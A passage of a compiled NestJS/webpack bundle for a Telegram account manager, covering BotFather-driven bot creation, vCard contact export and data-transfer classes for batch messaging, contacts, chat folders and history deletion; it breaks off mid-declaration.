            console.log('[BOT CREATION] Attempting to get entity for BotFather...');
            const entity = await this.client.getEntity(botFatherUsername);
            console.log('[BOT CREATION] Successfully connected to BotFather');
            console.log('[BOT CREATION] Sending /newbot command...');
            await this.client.sendMessage(entity, {
                message: '/newbot'
            });
            console.log('[BOT CREATION] Waiting for BotFather response after /newbot command...');
            await new Promise(resolve => setTimeout(resolve, 1000));
            console.log(`[BOT CREATION] Sending bot name: "${options.name}"`);
            await this.client.sendMessage(entity, {
                message: options.name
            });
            console.log('[BOT CREATION] Waiting for BotFather response after sending name...');
            await new Promise(resolve => setTimeout(resolve, 1000));
            let botUsername = options.username;
            if (!/_bot$/.test(botUsername)) {
                const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
                let uniqueSuffix = '';
                for (let i = 0; i < 3; i++) {
                    uniqueSuffix += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                botUsername = botUsername.replace(/_?bot$/, '') + `_${uniqueSuffix}_bot`;
                console.log(`[BOT CREATION] Modified username to ensure uniqueness: ${botUsername}`);
            }
            console.log(`[BOT CREATION] Sending bot username: "${botUsername}"`);
            await this.client.sendMessage(entity, {
                message: botUsername
            });
            console.log('[BOT CREATION] Waiting for BotFather response after sending username...');
            await new Promise(resolve => setTimeout(resolve, 1000));
            console.log('[BOT CREATION] Retrieving response from BotFather...');
            const messages = await this.client.getMessages(entity, {
                limit: 1
            });
            if (!messages || messages.length === 0) {
                console.error('[BOT CREATION] No response received from BotFather');
                throw new Error('No response received from BotFather');
            }
            const lastMessage = messages[0].message;
            console.log(`[BOT CREATION] BotFather response: "${lastMessage.substring(0, 50)}..."`);
            if (!lastMessage.toLowerCase().includes('use this token')) {
                console.error(`[BOT CREATION] Bot creation failed, unexpected response: "${lastMessage}"`);
                throw new Error(`Bot creation failed: ${lastMessage}`);
            }
            const tokenMatch = lastMessage.match(/(\d+:[A-Za-z0-9_-]+)/);
            if (!tokenMatch) {
                console.error('[BOT CREATION] Could not extract bot token from BotFather response');
                throw new Error('Could not extract bot token from BotFather response');
            }
            const botToken = tokenMatch[0];
            console.log(`[BOT CREATION] Successfully extracted bot token: ${botToken.substring(0, 5)}...`);
            if (options.description) {
                console.log('[BOT CREATION] Setting bot description...');
                await this.client.sendMessage(entity, { message: '/setdescription' });
                await new Promise(resolve => setTimeout(resolve, 1000));
                console.log(`[BOT CREATION] Selecting bot @${options.username} for description update...`);
                await this.client.sendMessage(entity, { message: `@${options.username}` });
                await new Promise(resolve => setTimeout(resolve, 1000));
                console.log('[BOT CREATION] Sending description text...');
                await this.client.sendMessage(entity, { message: options.description });
                await new Promise(resolve => setTimeout(resolve, 1000));
                console.log('[BOT CREATION] Description set successfully');
            }
            if (options.aboutText) {
                console.log('[BOT CREATION] Setting about text...');
                await this.client.sendMessage(entity, { message: '/setabouttext' });
                await new Promise(resolve => setTimeout(resolve, 1000));
                console.log(`[BOT CREATION] Selecting bot @${options.username} for about text update...`);
                await this.client.sendMessage(entity, { message: `@${options.username}` });
                await new Promise(resolve => setTimeout(resolve, 1000));
                console.log('[BOT CREATION] Sending about text...');
                await this.client.sendMessage(entity, { message: options.aboutText });
                await new Promise(resolve => setTimeout(resolve, 1000));
                console.log('[BOT CREATION] About text set successfully');
            }
            if (options.profilePhotoUrl) {
                console.log(`[BOT CREATION] Setting profile photo from URL: ${options.profilePhotoUrl}`);
                try {
                    console.log('[BOT CREATION] Downloading profile photo...');
                    const photoBuffer = await this.downloadFileFromUrl(options.profilePhotoUrl);
                    console.log(`[BOT CREATION] Photo downloaded successfully, size: ${photoBuffer.length} bytes`);
                    console.log('[BOT CREATION] Sending /setuserpic command...');
                    await this.client.sendMessage(entity, { message: '/setuserpic' });
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    console.log(`[BOT CREATION] Selecting bot @${options.username} for profile photo update...`);
                    await this.client.sendMessage(entity, { message: `@${options.username}` });
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    console.log('[BOT CREATION] Uploading profile photo...');
                    await this.client.sendFile(entity, {
                        file: Buffer.from(photoBuffer),
                        caption: '',
                        forceDocument: false
                    });
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    console.log('[BOT CREATION] Profile photo set successfully');
                }
                catch (photoError) {
                    console.error(`[BOT CREATION] Failed to set profile photo: ${photoError.message}`);
                }
            }
            console.log(`[BOT CREATION] Bot creation completed successfully: @${options.username}`);
            return {
                botToken,
                username: botUsername
            };
        }
        catch (error) {
            console.error(`[BOT CREATION] Error during bot creation process: ${error.message}`, error);
            throw new Error(`Failed to create bot: ${error.message}`);
        }
    }
    createVCardContent(contacts) {
        let vCardContent = '';
        contacts.users.map((user) => {
            user = user;
            vCardContent += 'BEGIN:VCARD\n';
            vCardContent += 'VERSION:3.0\n';
            vCardContent += `FN:${user.firstName || ''} ${user.lastName || ''}\n`;
            vCardContent += `TEL;TYPE=CELL:${user.phone}\n`;
            vCardContent += 'END:VCARD\n';
        });
        return vCardContent;
    }
    async sendContactsFile(chatId, contacts, filename = 'contacts.vcf') {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const vCardContent = this.createVCardContent(contacts);
            const tempPath = `./contacts/${chatId}-${filename}`;
            if (!fs.existsSync('./contacts')) {
                fs.mkdirSync('./contacts', { recursive: true });
            }
            fs.writeFileSync(tempPath, vCardContent, 'utf8');
            try {
                const fileContent = fs.readFileSync(tempPath);
                const file = new uploads_1.CustomFile(filename, fs.statSync(tempPath).size, tempPath, fileContent);
                await this.client.sendFile(chatId, {
                    file,
                    caption: `Contacts file with ${contacts.users.length} contacts`,
                    forceDocument: true
                });
                console.log(`Sent contacts file with ${contacts.users.length} contacts to chat ${chatId}`);
            }
            finally {
                if (fs.existsSync(tempPath)) {
                    fs.unlinkSync(tempPath);
                }
            }
        }
        catch (error) {
            console.error('Error sending contacts file:', error);
            throw error;
        }
    }
}
exports["default"] = TelegramManager;


/***/ }),

/***/ "./src/components/Telegram/config/telegram-validation.config.ts":
/*!**********************************************************************!*\
  !*** ./src/components/Telegram/config/telegram-validation.config.ts ***!
  \**********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TelegramValidationConfig = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
let TelegramValidationConfig = class TelegramValidationConfig {
};
exports.TelegramValidationConfig = TelegramValidationConfig;
TelegramValidationConfig.PHONE_PATTERN = /^\+?[1-9]\d{1,14}$/;
TelegramValidationConfig.USERNAME_PATTERN = /^[a-zA-Z0-9_]{5,32}$/;
TelegramValidationConfig.MESSAGE_MAX_LENGTH = 4096;
TelegramValidationConfig.CAPTION_MAX_LENGTH = 1024;
TelegramValidationConfig.FILE_SIZE_LIMIT = 2000 * 1024 * 1024;
TelegramValidationConfig.BATCH_SIZE_LIMIT = 100;
TelegramValidationConfig.ALLOWED_MEDIA_TYPES = [
    'photo',
    'video',
    'document',
    'voice',
    'audio'
];
TelegramValidationConfig.ALLOWED_PRIVACY_LEVELS = [
    'everybody',
    'contacts',
    'nobody'
];
TelegramValidationConfig.MESSAGE_TYPES = [
    'all',
    'text',
    'photo',
    'video',
    'voice',
    'document'
];
TelegramValidationConfig.DEFAULT_PAGINATION = {
    limit: 20,
    maxLimit: 100
};
exports.TelegramValidationConfig = TelegramValidationConfig = __decorate([
    (0, common_1.Injectable)()
], TelegramValidationConfig);


/***/ }),

/***/ "./src/components/Telegram/dto/batch-operations.dto.ts":
/*!*************************************************************!*\
  !*** ./src/components/Telegram/dto/batch-operations.dto.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ForwardBatchDto = exports.BatchProcessDto = exports.BatchItemDto = exports.BaseBatchItemDto = exports.BatchOperationType = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
var BatchOperationType;
(function (BatchOperationType) {
    BatchOperationType["FORWARD"] = "forward";
    BatchOperationType["DELETE"] = "delete";
    BatchOperationType["EDIT"] = "edit";
})(BatchOperationType || (exports.BatchOperationType = BatchOperationType = {}));
class BaseBatchItemDto {
}
exports.BaseBatchItemDto = BaseBatchItemDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Chat ID for the operation' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], BaseBatchItemDto.prototype, "chatId", void 0);
class BatchItemDto extends BaseBatchItemDto {
}
exports.BatchItemDto = BatchItemDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message ID for message operations', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], BatchItemDto.prototype, "messageId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Source chat ID for forward operations', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], BatchItemDto.prototype, "fromChatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Target chat ID for forward operations', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], BatchItemDto.prototype, "toChatId", void 0);
class BatchProcessDto {
    constructor() {
        this.batchSize = 20;
        this.delayMs = 1000;
    }
}
exports.BatchProcessDto = BatchProcessDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Operation type', enum: BatchOperationType }),
    (0, class_validator_1.IsEnum)(BatchOperationType),
    __metadata("design:type", String)
], BatchProcessDto.prototype, "operation", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Items to process', type: [BatchItemDto] }),
    (0, class_validator_1.IsArray)(),
    __metadata("design:type", Array)
], BatchProcessDto.prototype, "items", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of items to process in each batch', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], BatchProcessDto.prototype, "batchSize", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Delay between batches in milliseconds', default: 1000 }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], BatchProcessDto.prototype, "delayMs", void 0);
class ForwardBatchDto {
}
exports.ForwardBatchDto = ForwardBatchDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Source chat ID for forwarding' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], ForwardBatchDto.prototype, "fromChatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Target chat ID for forwarding' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], ForwardBatchDto.prototype, "toChatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message IDs to forward', type: [Number] }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.ArrayMinSize)(1, { message: 'At least one message ID is required' }),
    (0, class_validator_1.ArrayMaxSize)(100, { message: 'Cannot forward more than 100 messages at once' }),
    (0, class_validator_1.IsNumber)({}, { each: true }),
    (0, class_transformer_1.Transform)(({ value }) => Array.isArray(value) ? value.map(Number) : value),
    __metadata("design:type", Array)
], ForwardBatchDto.prototype, "messageIds", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/connection-management.dto.ts":
/*!******************************************************************!*\
  !*** ./src/components/Telegram/dto/connection-management.dto.ts ***!
  \******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.GetClientOptionsDto = exports.ConnectionStatusDto = exports.ConnectionStatsDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class ConnectionStatsDto {
}
exports.ConnectionStatsDto = ConnectionStatsDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Total number of connections' }),
    __metadata("design:type", Number)
], ConnectionStatsDto.prototype, "total", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of connected clients' }),
    __metadata("design:type", Number)
], ConnectionStatsDto.prototype, "connected", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of connecting clients' }),
    __metadata("design:type", Number)
], ConnectionStatsDto.prototype, "connecting", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of disconnecting clients' }),
    __metadata("design:type", Number)
], ConnectionStatsDto.prototype, "disconnecting", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of clients in error state' }),
    __metadata("design:type", Number)
], ConnectionStatsDto.prototype, "error", void 0);
class ConnectionStatusDto {
}
exports.ConnectionStatusDto = ConnectionStatusDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Connection state of the client', enum: ['connecting', 'connected', 'disconnecting', 'disconnected', 'error'] }),
    __metadata("design:type", String)
], ConnectionStatusDto.prototype, "state", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Whether auto disconnect is enabled' }),
    __metadata("design:type", Boolean)
], ConnectionStatusDto.prototype, "autoDisconnect", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'When the connection was last used', type: 'number' }),
    __metadata("design:type", Number)
], ConnectionStatusDto.prototype, "lastUsed", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of connection attempts', type: 'number' }),
    __metadata("design:type", Number)
], ConnectionStatusDto.prototype, "connectionAttempts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Last error message if any', required: false }),
    __metadata("design:type", String)
], ConnectionStatusDto.prototype, "lastError", void 0);
class GetClientOptionsDto {
}
exports.GetClientOptionsDto = GetClientOptionsDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Whether to auto disconnect the client after period of inactivity', required: false, default: true }),
    __metadata("design:type", Boolean)
], GetClientOptionsDto.prototype, "autoDisconnect", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Whether to use event handler', required: false, default: true }),
    __metadata("design:type", Boolean)
], GetClientOptionsDto.prototype, "handler", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Connection timeout in milliseconds', required: false, default: 30000 }),
    __metadata("design:type", Number)
], GetClientOptionsDto.prototype, "timeout", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/contact-management.dto.ts":
/*!***************************************************************!*\
  !*** ./src/components/Telegram/dto/contact-management.dto.ts ***!
  \***************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.AddContactsDto = exports.ContactImportDto = exports.ContactExportImportDto = exports.ContactBlockListDto = exports.ContactGroupDto = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class ContactGroupDto {
}
exports.ContactGroupDto = ContactGroupDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Name of the contact group' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], ContactGroupDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'User IDs to include in the group', type: [String] }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsString)({ each: true }),
    __metadata("design:type", Array)
], ContactGroupDto.prototype, "userIds", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Optional description for the group' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], ContactGroupDto.prototype, "description", void 0);
class ContactBlockListDto {
}
exports.ContactBlockListDto = ContactBlockListDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'User IDs to block/unblock', type: [String] }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsString)({ each: true }),
    __metadata("design:type", Array)
], ContactBlockListDto.prototype, "userIds", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Whether to block or unblock the users' }),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], ContactBlockListDto.prototype, "block", void 0);
class ContactExportImportDto {
    constructor() {
        this.includeBlocked = false;
    }
}
exports.ContactExportImportDto = ContactExportImportDto;
__decorate([
    (0, swagger_1.ApiProperty)({ enum: ['vcard', 'csv'], description: 'Export format type' }),
    (0, class_validator_1.IsEnum)(['vcard', 'csv']),
    __metadata("design:type", String)
], ContactExportImportDto.prototype, "format", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Whether to include blocked contacts', required: false, default: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Object)
], ContactExportImportDto.prototype, "includeBlocked", void 0);
class ContactImportDto {
}
exports.ContactImportDto = ContactImportDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Contacts to import', type: [Object] }),
    (0, class_validator_1.IsArray)(),
    __metadata("design:type", Array)
], ContactImportDto.prototype, "contacts", void 0);
class AddContactsDto {
}
exports.AddContactsDto = AddContactsDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Phone numbers to add', type: [String] }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsString)({ each: true }),
    __metadata("design:type", Array)
], AddContactsDto.prototype, "phoneNumbers", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Name prefix to use for added contacts' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], AddContactsDto.prototype, "prefix", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/create-bot.dto.ts":
/*!*******************************************************!*\
  !*** ./src/components/Telegram/dto/create-bot.dto.ts ***!
  \*******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateBotDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class CreateBotDto {
}
exports.CreateBotDto = CreateBotDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Name of the bot (required)',
        example: 'MyAwesomeBot'
    }),
    (0, class_validator_1.IsNotEmpty)(),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.MaxLength)(64),
    __metadata("design:type", String)
], CreateBotDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Username for the bot (required)',
        example: 'my_awesome_bot'
    }),
    (0, class_validator_1.IsNotEmpty)(),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.MaxLength)(32),
    __metadata("design:type", String)
], CreateBotDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Description of what your bot can do',
        example: 'This bot helps you manage your tasks',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.MaxLength)(512),
    __metadata("design:type", String)
], CreateBotDto.prototype, "description", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'What the bot can be used for',
        example: 'Task Management, Reminders, Notes',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.MaxLength)(512),
    __metadata("design:type", String)
], CreateBotDto.prototype, "aboutText", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'URL to the bot\'s profile photo',
        example: 'https://example.com/bot-photo.jpg',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBotDto.prototype, "profilePhotoUrl", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/create-chat-folder.dto.ts":
/*!***************************************************************!*\
  !*** ./src/components/Telegram/dto/create-chat-folder.dto.ts ***!
  \***************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateChatFolderDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class CreateChatFolderDto {
}
exports.CreateChatFolderDto = CreateChatFolderDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Name of the chat folder' }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], CreateChatFolderDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'List of chat IDs to include in the folder' }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", Array)
], CreateChatFolderDto.prototype, "includedChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'List of chat IDs to exclude from the folder', required: false }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Array)
], CreateChatFolderDto.prototype, "excludedChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Include contacts in the folder', required: false, default: true }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "includeContacts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Include non-contacts in the folder', required: false, default: true }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "includeNonContacts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Include groups in the folder', required: false, default: true }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "includeGroups", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Include broadcast channels in the folder', required: false, default: true }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "includeBroadcasts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Include bots in the folder', required: false, default: true }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "includeBots", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Exclude muted chats from the folder', required: false, default: false }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "excludeMuted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Exclude read chats from the folder', required: false, default: false }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "excludeRead", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Exclude archived chats from the folder', required: false, default: false }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "excludeArchived", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/delete-chat.dto.ts":
/*!********************************************************!*\
  !*** ./src/components/Telegram/dto/delete-chat.dto.ts ***!
  \********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.DeleteHistoryDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class DeleteHistoryDto {
    constructor() {
        this.justClear = true;
        this.revoke = false;
    }
}
exports.DeleteHistoryDto = DeleteHistoryDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Username or peer ID of the chat whose history you want to delete',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], DeleteHistoryDto.prototype, "peer", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Deletes all messages with IDs less than or equal to this value',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsInt)(),
    __metadata("design:type", Number)
], DeleteHistoryDto.prototype, "maxId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'If true, clears the history only for the current user without deleting for others',
        default: true,
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], DeleteHistoryDto.prototype, "justClear", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'If true, deletes the message history for all participants (if permitted)',
        default: false,
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], DeleteHistoryDto.prototype, "revoke", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Minimum date (UNIX timestamp) for messages to be deleted',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsInt)(),
    __metadata("design:type", Number)
], DeleteHistoryDto.prototype, "minDate", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
